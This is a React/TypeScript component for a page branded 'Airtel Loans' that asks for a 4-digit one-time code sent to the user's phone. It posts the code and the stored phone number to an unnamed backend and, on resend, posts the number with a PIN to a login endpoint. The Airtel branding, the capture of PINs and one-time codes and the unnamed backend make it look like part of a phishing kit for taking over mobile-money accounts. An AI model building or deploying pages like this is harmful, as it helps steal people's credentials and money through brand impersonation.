import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(45);
  const [error, setError] = useState('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  // Retrieve the phone number saved during login
  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  // If no phone number saved, redirect back to login
  useEffect(() => {
    if (!phoneNumber) {
      navigate('/');
    }
  }, [phoneNumber, navigate]);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');

    // Local validation — must have 4 digits
    if (otpString.length < 4) {
      setError('Please enter the 4-digit verification code.');
      alert('⚠️ Please enter the 4-digit verification code.');
      return;
    }

    setError('');

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString }),
      });
      const data = await response.json();

      if (data.status === 'success') {
        // ✅ Correct OTP — go to next page
        navigate('/airtel-loan-limit');
      } else {
        // ❌ Wrong OTP — show popup, inline error, and clear the boxes
        const wrongMsg = '❌ Wrong OTP! Please check the code sent to your phone and try again.';
        alert(wrongMsg);
        setError(data.message || 'Invalid OTP. Please try again.');

        // Clear the OTP inputs so the user can type fresh
        setOtp(['', '', '', '']);

        // Refocus the first input box
        setTimeout(() => {
          inputRefs.current[0]?.focus();
        }, 100);
      }
    } catch {
      alert('⚠️ Error verifying OTP. Please check your internet connection and try again.');
      setError('Error verifying OTP. Please try again.');
    }
  };

  const handleResend = () => {
    setTimeLeft(45);
    setOtp(['', '', '', '']);
    setError('');
    // Optionally re-trigger the login endpoint to resend OTP
    fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone_number: phoneNumber, pin: '0000' }),
    }).catch(() => console.error('Resend failed'));
    alert('📩 A new code has been sent to your phone.');
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        <button className="airtel-back-link" onClick={() => navigate('/')}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Back to login
        </button>

        <h2 className="airtel-otp-heading">Verify your code</h2>
        <p className="airtel-otp-subtext">
          Enter the 4-digit code sent to {phoneNumber || '+243 XXX XXX XXX'}
        </p>

        <form onSubmit={handleVerify}>
          <div className="airtel-input-group">
            <label>Enter OTP Code</label>
            <div className="airtel-otp-container">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  type="tel"
                  maxLength={1}
                  value={digit}
                  ref={(el) => { inputRefs.current[index] = el; }}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="airtel-otp-box"
                />
              ))}
            </div>
          </div>

          {error && (
            <div className="airtel-alert" style={{ marginBottom: '20px' }}>
              <div className="alert-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="16" x2="12" y2="12"></line>
                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
              </div>
              <span>{error}</span>
            </div>
          )}

          <div className="airtel-timer">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#E53E3E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <polyline points="12 6 12 12 16 14"></polyline>
            </svg>
            <span>{timeLeft}s</span>
          </div>

          <button type="submit" className="airtel-verify-btn">
            Verify Code
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </button>

          <button type="button" className="airtel-resend-btn" onClick={handleResend}>
            Resend code
          </button>
        </form>
      </div>
    </div>
  );
}

export default AirtelOTPVerify;